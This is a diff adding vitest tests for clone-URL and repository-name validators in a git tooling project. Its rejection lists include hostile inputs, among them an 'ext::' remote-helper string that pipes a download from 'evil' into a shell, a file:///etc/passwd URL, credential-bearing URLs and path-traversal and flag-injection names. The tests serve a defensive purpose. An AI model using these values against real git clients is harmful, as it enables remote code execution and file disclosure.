@@ -1,6 +1,6 @@
 import { describe, it, expect } from "vitest";
 
-import { run, assertSafeRef, VcsError, type Runner, type ExecResult } from "../src/exec.js";
+import { run, assertSafeRef, assertSafeRepoUrl, assertSafeRepoId, parseGithubRepo, VcsError, type Runner, type ExecResult } from "../src/exec.js";
 import { push, openPr, mergePr, commitAll, getDiff, cloneRepo, freshBase } from "../src/git.js";
 import { createWorktree, removeWorktree } from "../src/worktree.js";
 import { squashAllAndForcePush } from "../src/git-admin.js";
@@ -32,6 +32,64 @@ describe("run() / VcsError", () => {
     const { run: r, calls } = makeRunner();
     await run(r, "git", ["status"], "/repo");
     expect(calls[0]!.opts).toEqual({ cwd: "/repo" });
+  });
+});
+
+describe("assertSafeRepoUrl — CEO-supplied clone URL allowlist", () => {
+  it("accepts plain https github URLs", () => {
+    for (const ok of ["https://github.com/acme/widget", "https://github.com/acme/widget.git", "https://GitHub.com/a/b"]) {
+      expect(() => assertSafeRepoUrl(ok)).not.toThrow();
+    }
+  });
+
+  it.each([
+    "file:///etc/passwd", // local fs into a browsable clone
+    "ext::sh -c 'curl evil|sh'", // remote-helper RCE — git EXECUTES this
+    "transport::https://x", // remote-helper
+    "fd::7", // remote-helper
+    "git@github.com:acme/widget.git", // scp-like ssh form (https-only v1)
+    "https://user:pass@github.com/a/b", // embedded credentials
+    "https://gitlab.com/a/b", // host not on the allowlist
+    "http://github.com/a/b", // not https
+    "-https://github.com/a/b", // leading "-"
+    "not a url",
+    "",
+  ])("rejects the unsafe URL %j", (bad) => {
+    expect(() => assertSafeRepoUrl(bad)).toThrow(VcsError);
+  });
+});
+
+describe("assertSafeRepoId — owner/name charset + path safety", () => {
+  it("accepts valid GitHub logins / repo names", () => {
+    expect(() => assertSafeRepoId("acme", "widget")).not.toThrow();
+    expect(() => assertSafeRepoId("a-b", "my.repo_v2-x")).not.toThrow();
+  });
+
+  it.each([
+    ["..", "widget"],
+    ["acme", ".."],
+    ["acme", "."],
+    ["acme", "-flag"],
+    ["a/b", "widget"],
+    ["acme", "a/b"],
+    ["acme", "a b"],
+    ["-acme", "widget"],
+    ["", "widget"],
+  ])("rejects unsafe owner=%j name=%j", (owner, name) => {
+    expect(() => assertSafeRepoId(owner, name)).toThrow(VcsError);
+  });
+});
+
+describe("parseGithubRepo", () => {
+  it("derives {owner,name} from a validated URL (strips .git, ignores deep paths)", () => {
+    expect(parseGithubRepo("https://github.com/acme/widget")).toEqual({ owner: "acme", name: "widget" });
+    expect(parseGithubRepo("https://github.com/acme/widget.git")).toEqual({ owner: "acme", name: "widget" });
+    expect(parseGithubRepo("https://github.com/acme/widget/tree/main")).toEqual({ owner: "acme", name: "widget" });
+  });
+
+  it("throws on an unsafe URL or a URL missing owner/repo", () => {
+    expect(() => parseGithubRepo("file:///x")).toThrow(VcsError);
+    expect(() => parseGithubRepo("https://github.com/acme")).toThrow(VcsError);
   });
 });
 
